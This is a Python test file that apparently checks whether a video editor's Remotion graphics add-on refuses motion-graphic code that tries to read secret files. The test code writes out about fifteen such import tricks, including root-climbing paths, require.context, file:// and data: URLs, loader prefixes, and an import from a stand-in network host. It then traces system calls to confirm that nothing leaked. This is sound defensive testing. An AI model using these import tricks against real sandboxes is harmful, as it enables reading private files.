"""What a motion graphic's code may import and read on the graphics add-on (Remotion): only react and remotion, nothing
from the computer's files, and nothing it names is ever opened. Port of packages/core/scripts/smoke-graphicimports.ts
(judge/PORTING.md has the map of its sections).

The secrets are files in the test's own folder (readable by the editor's user), holding a random token. Each hostile
graphic imports one of them in another way (a relative path that climbs to the root and back down, an absolute path,
a .json, a .png, a .css, require(), require.context, import() of an expression, new URL(..., import.meta.url), a
file:// URL, a data: URL, a loader prefix) or imports another package or a remotion subpath. Each must be refused.
What the editor did meanwhile is observed from outside: no answer of the editor holds the token, no file-system call
of the editor or of anything it started names the secrets' folder (strace, t.driver(trace=True); never argv), and
the refused graphics added nothing to the project. A network import (//zr-evil-gi.invalid/...) is refused and that
computer is never opened. The positive controls: a graphic that imports react, its JSX runtimes and remotion renders
and shows the colour it draws, and the built-in title card renders.

Everything here is about the graphics add-on: without one given to the judge (run.py --graphics-addon) every check is
recorded as not applicable (run.py --strict fails them). Every check is recorded on every path, so CHECKS is exact.
"""
import json
import os
import secrets as rnd

import driver as drv
from driver import refused
import observe

PORT_BOUND = True
TIMEOUT = 1500
NET_HOST = "zr-evil-gi.invalid"
ALLOWED_COLOUR = (255, 0, 255)  # what the allowed graphic draws
UP = "../" * 40  # from wherever the editor keeps a graphic's code, enough '..' to reach the root


def hostile(secrets_dir):
    """[(what, code)]: the original's G1 rows, each importing a secret file (or what a graphic may not import)."""
    j = json.dumps
    txt, png = os.path.join(secrets_dir, "secret.txt"), os.path.join(secrets_dir, "secret.png")
    rel = UP + txt.lstrip("/")
    reldir = UP + secrets_dir.lstrip("/")
    return [
        ("a relative path to the secret", f"import s from {j(rel)};\nexport default () => String(s);"),
        ("the secret's absolute path", f"import s from {j(txt)};\nexport default () => String(s);"),
        ("a .json secret", f"import s from {j(os.path.join(secrets_dir, 'secret.json'))};\n"
                    "export default () => JSON.stringify(s);"),
        ("a .png secret", f"import s from {j(png)};\nexport default () => String(s);"),
        ("a .css secret", f"import {j(os.path.join(secrets_dir, 'secret.css'))};\nexport default () => null;"),
        ("another package (webpack)", 'import w from "webpack";\nexport default () => String(w);'),
        ("a remotion subpath (remotion/no-react)", 'import { NoReactInternals } from "remotion/no-react";\n'
                               "export default () => String(NoReactInternals);"),
        ("require.context of the root folder", 'const ctx = (require as any).context("/", true, /secret\\.txt$/);\n'
                                 "export default () => String(ctx.keys());"),
        ("require.context of the secrets' folder", f"const ctx = (require as any).context({j(reldir)}, false, "
                                                   "/secret\\.txt$/);\nexport default () => String(ctx.keys().map(ctx));"),
        ("require() of the secret", f"const s = require({j(txt)});\nexport default () => String(s);"),
        ("import() of an expression in the secrets' folder", 'const n = Math.random() > 2 ? "x" : "secret";\n'
                                         f"export default () => (void import({j(reldir + '/')} + n + \".txt\"), null);"),
        ("new URL(..., import.meta.url) of the secret", f"const u = new URL({j(UP + png.lstrip('/'))}, import.meta.url);\n"
                                          "export default () => u.href;"),
        ("a file:// URL of the secret", f"import s from {j('file://' + txt)};\nexport default () => String(s);"),
        ("a data: URL module", 'import d from "data:text/javascript,export default 1";\nexport default () => String(d);'),
        ("a loader! prefix on the secret", f"import s from {j('!!raw-loader!' + txt)};\nexport default () => String(s);"),
    ]


ALLOWED = """import React, { useMemo } from "react";
import { jsx } from "react/jsx-runtime";
import { jsxDEV } from "react/jsx-dev-runtime";
import { AbsoluteFill, useCurrentFrame } from "remotion";
export default function Allowed() {
  const frame = useCurrentFrame();
  const label = useMemo(() => "judge-" + frame, [frame]);
  return <AbsoluteFill style={{ background: "#ff00ff" }}>{jsx("span", { children: label, style: { fontSize: 1 } })}
    {String(typeof jsxDEV).slice(0, 0)}{React.version.slice(0, 0)}</AbsoluteFill>;
}
"""

ROWS = [f"a graphic that loads {what} is refused" for what, _ in hostile("/s")]
NAMES = (["the graphics add-on is chosen in the window and ready (the State says so)"] + ROWS + [
    f"a graphic that imports a network path (//{NET_HOST}/...) is refused",
    "the refused graphics added nothing to the project (no clip, asset or graphic)",
    "no answer of the editor (results and errors) held 8 characters of the secret files' text",
    "no file-system call of the editor or of anything it started named the secrets' folder",
    f"no file-system call of the editor or of anything it started named {NET_HOST}",
    "a graphic that imports react, react/jsx-runtime, react/jsx-dev-runtime and remotion renders",
    "…and its frame shows the colour it draws",
    "the built-in title card (the title template) renders",
    "control: the trace saw the editor write the allowed graphic's rendered file (a 1 s video in the test's folder, "
    "which the State names)",
])
CHECKS = len(NAMES)


def snapshot(d):
    """(asset ids, clip ids, graphic ids) of the project."""
    st = d.get_state()
    clips = [c for tr in st.get("tracks", []) for c in tr.get("clips", [])]
    return (sorted(a.get("id") or "" for a in st.get("assets", [])), sorted(c.get("id") or "" for c in clips),
            sorted(g for c in clips for g in c.get("graphics") or []))


def frame_colour(t, d, clip_id, name):
    """The mean colour at the middle of clip `clip_id`'s first second (a frame the editor renders), or None."""
    st = d.get_state()
    fps = (st.get("canvas") or {}).get("fps") or 30
    c = next((c for tr in st.get("tracks", []) for c in tr.get("clips", []) if c.get("id") == clip_id), None)
    if c is None:
        return None, "the clip is not in the State"
    at = (c["start_frame"] + min(c.get("length_frames") or 1, fps) / 2) / fps
    try:
        path = d.render_frame(at, t.path("frames", f"{name}.png"))
        return observe.mean_rgb(path), f"frame at {at:.2f} s"
    except (drv.JudgeError, observe.Unmeasurable) as e:
        return None, str(e)


def rendered(fn):
    """(result or None, what happened) of a render that must succeed, tried twice: v0.2.0 picks a free port for the
    add-on's server and binds it later, and another process can take the port in between (the render then fails)."""
    said = []
    for _ in range(2):
        try:
            return fn(), "; ".join(said)
        except (drv.ProductError, drv.BadRequest) as e:
            said.append(f"refused: {e.message[:200]}")
    return None, "; ".join(said)


def trace_check(t, name, ok_fn, detail_fn):
    if not t.trace:
        t.not_observed(name, t.trace_why or "strace is not installed")
    elif t.trace.tampered:
        t.check(name, False, t.trace.tampered)
    else:
        t.check(name, ok_fn(), detail_fn())


def run(t):
    if not t.graphics_addon:
        for name in NAMES:
            t.not_applicable(name, t.graphics_addon_why)
        return
    d = t.driver(trace=True, graphics_addon=True)
    d.set_project(width=160, height=90, fps=30)
    # Random text only: an error that quotes an import's path (the folder's name) must not look like a leak.
    token = rnd.token_hex(16)
    secrets_dir = os.path.dirname(t.path(f"judge-secrets-{rnd.token_hex(4)}", "secret.txt"))
    files = {"secret.txt": f"{token} is the secret\n".encode(), "secret.json": json.dumps({"k": token}).encode(),
             "secret.png": bytes.fromhex("89504e470d0a1a0a") + token.encode(),
             "secret.css": f'.a {{ content: "{token}"; }}\n'.encode()}
    for name, body in files.items():
        p = os.path.join(secrets_dir, name)
        with open(p, "wb") as f:
            f.write(body)
        os.chmod(p, 0o644)  # the editor's user can read them: a refusal is the editor's, not the file system's

    ok, what = refused(lambda: d.set_graphics_renderer("addon"))
    g = d.get_state().get("graphics")
    t.check(NAMES[0], not ok and g == {"renderer": "addon", "ready": True}, f"{what}; State graphics {g}")

    # ---- G1, G2: refused, and nothing added
    before = snapshot(d)
    for name, (what, code) in zip(ROWS, hostile(secrets_dir)):
        ok, said = refused(lambda code=code: d.add_graphic(code=code, duration_s=1))
        t.check(name, ok, said[:200])
    ok, said = refused(lambda: d.add_graphic(code=f'import x from "//{NET_HOST}/s/x";\nexport default () => String(x);',
                                             duration_s=1))
    t.check(NAMES[len(ROWS) + 1], ok, said[:200])
    after = snapshot(d)
    t.check(NAMES[len(ROWS) + 2], after == before, f"{before} -> {after}")
    texts = d.transcript()
    leaked = [x[:120] for x in texts if observe.holds_secret(x, token)]
    t.check(NAMES[len(ROWS) + 3], len(texts) > 0 and not leaked, leaked[:2] or f"{len(texts)} answers checked")
    folder = os.path.basename(secrets_dir)
    trace_check(t, NAMES[len(ROWS) + 4], lambda: not observe.trace_hits(t.trace, [folder]),
                lambda: observe.trace_hits(t.trace, [folder])[:3] or f"none of {len(observe.trace_lines(t.trace))}")
    trace_check(t, NAMES[len(ROWS) + 5], lambda: not observe.trace_hits(t.trace, [NET_HOST]),
                lambda: observe.trace_hits(t.trace, [NET_HOST])[:3] or "none")

    # ---- G3: what a graphic may import still renders
    r, what = rendered(lambda: d.add_graphic(code=ALLOWED, duration_s=1))
    t.check(NAMES[len(ROWS) + 6], r is not None and bool(r.get("clip")), f"{r} {what}".strip())
    colour, how = frame_colour(t, d, (r or {}).get("clip"), "allowed") if r else (None, "not rendered")
    t.check(NAMES[len(ROWS) + 7], observe.colour_is(colour, ALLOWED_COLOUR), f"{colour} at {how} "
            f"(want {ALLOWED_COLOUR})")
    rt, what = rendered(lambda: d.add_graphic(template="title", props={"title": "Judge"}, duration_s=1))
    t.check(NAMES[len(ROWS) + 8], rt is not None and bool(rt.get("clip")), f"{rt} {what}".strip())
    asset = next((a for a in d.get_state().get("assets", []) if r and a.get("id") == r.get("asset")), None)
    path = (asset or {}).get("path")
    # The file must be the editor's render of this graphic: a file the test wrote (its frames) is not one.
    bad = observe.render_problem(path, t.scratch, 1, 30, [t.path("frames")])
    base = os.path.basename(path or "")
    trace_check(t, NAMES[len(ROWS) + 9], lambda: not bad and bool(observe.trace_hits(t.trace, [base])),
                lambda: f"the allowed graphic's rendered file: {bad}" if bad
                else f"{base}: {len(observe.trace_hits(t.trace, [base]))} line(s)")
